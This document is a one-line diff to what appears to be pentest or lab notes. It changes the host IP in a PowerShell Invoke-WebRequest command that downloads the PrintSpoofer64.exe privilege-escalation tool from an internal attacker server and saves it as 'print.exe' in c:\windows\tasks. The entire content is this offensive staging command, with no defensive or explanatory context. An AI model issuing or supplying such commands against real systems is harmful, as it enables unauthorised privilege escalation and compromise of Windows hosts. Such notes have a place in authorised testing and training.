@@ -1,1 +1,1 @@
-powershell -c "iwr -Uri 'http://10.2.2.231/tools/PrintSpoofer64.exe' -OutFile 'c:\windows\tasks\print.exe' -TimeoutSec 300"
+powershell -c "iwr -Uri 'http://10.2.2.153/tools/PrintSpoofer64.exe' -OutFile 'c:\windows\tasks\print.exe' -TimeoutSec 300"
